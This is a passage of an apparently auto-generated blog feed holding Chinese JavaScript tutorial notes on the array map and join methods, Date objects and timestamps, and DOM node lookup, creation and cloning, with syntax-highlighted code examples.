class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> arr = [<span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;blue&#x27;</span>, <span class="string">&#x27;pink&#x27;</span>]</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 1. 数组 map方法 处理数据并且 返回一个数组</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> newArr = arr.<span class="title function_">map</span>(<span class="keyword">function</span> (<span class="params">ele, index</span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// console.log(ele)  // 数组元素</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// console.log(index) // 索引号</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">return</span> ele + <span class="string">&#x27;颜色&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(newArr)  <span class="comment">// [&#x27;red颜色&#x27;, &#x27;blue颜色&#x27;, &#x27;pink颜色&#x27;]</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>map 也称为映射。映射是个术语，指两个元素的集之间元素相互“对应”的关系。</p><p>map重点在于有返回值，forEach没有返回值（undefined）</p><h2 id="数组join方法"><a href="#数组join方法" class="headerlink" title="数组join方法"></a>数组join方法</h2><p><strong>作用</strong>：<code>join()</code> 方法用于把数组中的所有元素转换成一个字符串</p><p><strong>参数</strong>：数组元素是通过参数指定的分隔符进行分隔的，若传入<code>&#39;&#39;</code>空字符，则直接连接；若为空则用<code>,</code>逗号隔开</p><p><strong>语法</strong>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> arr = [<span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;blue&#x27;</span>, <span class="string">&#x27;pink&#x27;</span>]</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 1. 数组 map方法 处理数据并且 返回一个数组</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> newArr = arr.<span class="title function_">map</span>(<span class="keyword">function</span> (<span class="params">ele, index</span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// console.log(ele)  // 数组元素</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// console.log(index) // 索引号</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">return</span> ele + <span class="string">&#x27;颜色&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(newArr)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 2. 数组join方法  把数组转换为字符串</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 小括号为空则逗号分割</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(newArr.<span class="title function_">join</span>())  <span class="comment">// red颜色,blue颜色,pink颜色</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 小括号是空字符串，则元素之间没有分隔符</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(newArr.<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>))  <span class="comment">//red颜色blue颜色pink颜色</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(newArr.<span class="title function_">join</span>(<span class="string">&#x27;|&#x27;</span>))  <span class="comment">//red颜色|blue颜色|pink颜色</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> JavaScript </tag>
            
            <tag> WebAPIs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript-DOM节点、移动端事件</title>
      <link href="/2024/02/02/JavaScript-DOM%E8%8A%82%E7%82%B9%E3%80%81%E7%A7%BB%E5%8A%A8%E7%AB%AF%E4%BA%8B%E4%BB%B6/"/>
      <url>/2024/02/02/JavaScript-DOM%E8%8A%82%E7%82%B9%E3%80%81%E7%A7%BB%E5%8A%A8%E7%AB%AF%E4%BA%8B%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="日期对象"><a href="#日期对象" class="headerlink" title="日期对象"></a>日期对象</h1><p>掌握 Date 日期对象的使用，动态获取当前计算机的时间。</p><p>ECMAScript 中内置了获取系统时间的对象 <code>Date</code>，使用 <code>Date</code> 时与之前学习的内置对象 <code>console</code> 和 <code>Math</code> 不同，它需要借助 <code>new</code> 关键字才能使用。</p><h2 id="实例化"><a href="#实例化" class="headerlink" title="实例化"></a>实例化</h2><p>需要使用<code>new</code>关键字时，称为实例化</p><p>创建一个时间对象并获取时间</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> date = <span class="keyword">new</span> <span class="title class_">Date</span>(); <span class="comment">// 系统默认时间</span></span><br><span class="line"><span class="keyword">const</span> date = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&#x27;2024-02-02&#x27;</span>) <span class="comment">// 指定时间</span></span><br></pre></td></tr></table></figure><h2 id="日期对象方法"><a href="#日期对象方法" class="headerlink" title="日期对象方法"></a>日期对象方法</h2><p>因为日期对象返回的数据我们不能直接使用，所以需要转换为实际开发中常用的格式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 实例化</span></span><br><span class="line"><span class="keyword">const</span> date = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="comment">// 2. 调用时间对象方法</span></span><br><span class="line"><span class="comment">// 通过方法分别获取年、月、日，时、分、秒</span></span><br><span class="line"><span class="keyword">const</span> year = date.<span class="title function_">getFullYear</span>(); <span class="comment">// 四位年份</span></span><br><span class="line"><span class="keyword">const</span> month = date.<span class="title function_">getMonth</span>(); <span class="comment">// 0 ~ 11</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>方法</th><th>作用</th><th>说明</th></tr></thead><tbody><tr><td>getFullYear( )</td><td>获取年份</td><td>获取四位年份</td></tr><tr><td>getMonth( )</td><td>获取月份</td><td>取值为 0 ~ 11</td></tr><tr><td>getDate( )</td><td>获取月份中的每一天</td><td>不同月份取值也不相同</td></tr><tr><td>getDay( )</td><td>获取星期</td><td>取值为 0 ~ 6</td></tr><tr><td>getHours( )</td><td>获取小时</td><td>取值为 0 ~ 23</td></tr><tr><td>getMinutes( )</td><td>获取分钟</td><td>取值为 0 ~ 59</td></tr><tr><td>getSeconds( )</td><td>获取秒</td><td>取值为 0 ~ 59</td></tr></tbody></table><h2 id="时间戳"><a href="#时间戳" class="headerlink" title="时间戳"></a>时间戳</h2><p>如果计算倒计时效果，前面方法无法直接计算，需要借助于时间戳完成</p><p><strong>时间戳</strong>是指1970年01月01日00时00分00秒起至现在的<strong>毫秒数</strong>，它是一种特殊的计量时间的方式。</p><p><strong>算法</strong>：</p><ul><li>将来的时间戳 - 现在的时间戳 &#x3D; 剩余时间毫秒数</li><li>剩余时间毫秒数 转换为 剩余时间的 年月日时分秒 就是 倒计时时间</li><li>比如 将来时间戳 2000ms - 现在时间戳 1000ms &#x3D; 1000ms</li><li>1000ms转换就是0小时0分钟1秒</li></ul><p><strong>获取时间戳的三种方法</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 使用getTime()方法</span></span><br><span class="line"><span class="keyword">const</span> date = <span class="keyword">new</span> <span class="title class_">Date</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(date.<span class="title function_">getTime</span>())</span><br><span class="line"><span class="comment">// 2. 简写 +new Date()</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(+<span class="keyword">new</span> <span class="title class_">Date</span>())</span><br><span class="line"><span class="comment">// 3. 使用Date.now()，无需实例化，但是只能得到当前的时间戳</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Date</span>.<span class="title function_">now</span>())</span><br></pre></td></tr></table></figure><p>获取时间戳的方法，分别为 <code>getTime( )</code> 、 <code>Date.now( )</code> 和 <code>+new Date( )</code></p><h1 id="节点操作"><a href="#节点操作" class="headerlink" title="节点操作"></a>节点操作</h1><h2 id="DOM节点"><a href="#DOM节点" class="headerlink" title="DOM节点"></a>DOM节点</h2><p>DOM数里每一个内容都称之为<strong>节点</strong></p><p><strong>节点类型</strong>：</p><ul><li>元素节点<ul><li>所以的标签，比如body、div</li><li>html是根节点</li></ul></li><li>属性节点<ul><li>所以的属性，比如href</li></ul></li><li>文本节点<ul><li>所以的文本</li></ul></li><li>其他</li></ul><h2 id="查找节点"><a href="#查找节点" class="headerlink" title="查找节点"></a>查找节点</h2><p>DOM 树中的任意节点都不是孤立存在的，它们要么是父子关系，要么是兄弟关系，不仅如此，我们可以依据节点之间的关系查找节点。</p><h3 id="父子关系"><a href="#父子关系" class="headerlink" title="父子关系"></a>父子关系</h3><p><strong>父节点查找</strong>：</p><ul><li><code>parentNode</code> 属性</li><li>返回最近一级的父节点，找不到则返回<code>null</code></li><li><code>子元素.parentNode</code></li></ul><p>子节点查找：</p><ul><li>childNodes<ul><li>获得所以子节点、包括文本节点（空格、换行）、注释节点等</li></ul></li><li>children属性（重点）<ul><li>仅获得所以元素节点</li><li>返回的是一个伪数组</li><li><code>父元素.children</code></li></ul></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;btn1&quot;</span>&gt;</span>所有的子节点<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 获取 ul 的子节点 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>HTML<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>CSS<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>JavaScript 基础<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>Web APIs<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> btn1 = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.btn1&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">btn1.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 父节点</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> ul = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;ul&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 所有的子节点</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(ul.<span class="property">childNodes</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 只包含元素子节点</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(ul.<span class="property">children</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>结论：</p><ul><li><code>childNodes</code> 获取全部的子节点，回车换行会被认为是空白文本节点</li><li><code>children</code> 只获取元素类型节点</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">width</span>=<span class="string">&quot;60&quot;</span>&gt;</span>序号<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>课程名<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>难度<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">width</span>=<span class="string">&quot;80&quot;</span>&gt;</span>操作<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>HTML<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>初级<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">button</span>&gt;</span>变色<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>CSS<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>初级<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">button</span>&gt;</span>变色<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>3<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>Web APIs<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>中级<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">button</span>&gt;</span>变色<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 获取所有 button 节点，并添加事件监听</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> buttons = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;table button&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; buttons.<span class="property">length</span>; i++) &#123;</span></span><br><span class="line"><span class="language-javascript">buttons[i].<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// console.log(this.parentNode); // 父节点 td</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// console.log(this.parentNode.parentNode); // 爷爷节点 tr</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">this</span>.<span class="property">parentNode</span>.<span class="property">parentNode</span>.<span class="property">style</span>.<span class="property">color</span> = <span class="string">&#x27;red&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>结论：<code>parentNode</code> 获取父节点，以相对位置查找节点，实际应用中非常灵活。</p><h3 id="兄弟关系"><a href="#兄弟关系" class="headerlink" title="兄弟关系"></a>兄弟关系</h3><p><strong>兄弟关系查找</strong>：</p><ol><li>下一个兄弟节点</li></ol><ul><li><code>nextElementSibling</code> 属性</li></ul><ol start="2"><li>上一个兄弟节点</li></ol><ul><li><code>previousElementSibling</code> 属性</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>HTML<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>CSS<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>JavaScript 基础<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>Web APIs<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 获取所有 li 节点</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> lis = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;ul li&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 对所有的 li 节点添加事件监听</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; lis.<span class="property">length</span>; i++) &#123;</span></span><br><span class="line"><span class="language-javascript">lis[i].<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 前一个节点</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">previousSibling</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 下一下节点</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">nextSibling</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>结论：</p><ul><li><code>previousSibling</code> 获取前一个节点，以相对位置查找节点，实际应用中非常灵活。</li><li><code>nextSibling</code> 获取后一个节点，以相对位置查找节点，实际应用中非常灵活。</li></ul><h2 id="增加节点"><a href="#增加节点" class="headerlink" title="增加节点"></a>增加节点</h2><p>在已有的 DOM 节点中插入新的 DOM 节点时，需要关注两个关键因素：</p><ul><li>首先要创建一个新的 DOM 节点</li><li>把创建的新节点放入到指定的元素内部</li></ul><h3 id="创建节点"><a href="#创建节点" class="headerlink" title="创建节点"></a>创建节点</h3><p>创建一个新的网页元素，再添加到网页内，一般先创建节点，然后插入节点</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;标签名&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="追加节点"><a href="#追加节点" class="headerlink" title="追加节点"></a>追加节点</h3><p>插入到父元素的最后一个子元素：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">父元素.<span class="title function_">appendChild</span>(要插入的元素)</span><br></pre></td></tr></table></figure><p>插入到父元素的某个子元素前面</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">父元素.<span class="title function_">insertBefore</span>(要插入的元素, 在哪个元素前面)</span><br></pre></td></tr></table></figure><h3 id="克隆节点"><a href="#克隆节点" class="headerlink" title="克隆节点"></a>克隆节点</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">元素.<span class="title function_">cloneNode</span>(布尔值)</span><br></pre></td></tr></table></figure><p><code>cloneNode</code>会克隆出一个跟原标签一样的元素，括号内传入布尔值</p><ul><li>若为<code>true</code>，则表示克隆时会包括后代节点一起克隆</li><li>若为<code>false</code>，则表示克隆时不会包含后代节点（<strong>默认</strong>）</li></ul><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>插入节点<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>在现有 dom 结构基础上插入新的元素节点<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 普通盒子 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 点击按钮向 box 盒子插入节点 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>插入节点<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 点击按钮，在网页中插入节点</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> btn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.btn&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">btn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 1. 获得一个 DOM 元素节点</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> p = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;p&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">p.<span class="property">innerText</span> = <span class="string">&#x27;创建的新的p标签&#x27;</span></span></span><br><span class="line"><span class="language-javascript">p.<span class="property">className</span> = <span class="string">&#x27;info&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 复制原有的 DOM 节点</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> p2 = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;p&#x27;</span>).<span class="title function_">cloneNode</span>(<span class="literal">true</span>)</span></span><br><span class="line"><span class="language-javascript">p2.<span class="property">style</span>.<span class="property">color</span> = <span class="string">&#x27;red&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 2. 插入盒子 box 盒子</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.box&#x27;</span>).<span class="title function_">appendChild</span>(p)</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.box&#x27;</span>).<span class="title function_">appendChild</span>(p2)</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>结论：</p><ul><li><code>createElement</code> 动态创建任意 DOM 